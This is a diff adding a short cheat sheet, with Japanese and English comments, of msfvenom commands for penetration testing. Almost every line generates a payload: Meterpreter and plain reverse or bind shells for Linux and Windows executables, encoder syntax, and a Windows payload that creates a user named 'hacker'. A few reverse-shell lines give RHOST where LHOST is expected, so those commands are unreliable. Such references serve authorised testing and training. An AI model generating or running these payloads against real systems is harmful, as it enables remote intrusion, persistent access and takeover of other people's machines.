@@ -1,0 +1,17 @@
+//msfvenom
+msfvenom -l payloads	#ペイロードの羅列
+msfvenom -p PAYLOAD --list-options	#List payload options
+
+//基本構文
+msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP	#Payload Encoding
+
+//よく使う
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf	#Linux Meterpreter reverse shell x86 multi stage
+msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	#Linux Meterpreter bind shell x86 multi stage
+msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	#Linux bind shell x64 single stage
+msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	#Linux reverse shell x64 single stage
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	#Windows Meterpreter reverse shell
+msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe	#Windows Meterpreter bind shell
+msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	#Windows CMD Multi Stage
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe	#Windows CMD Single Stage
+msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe	#Windows add user
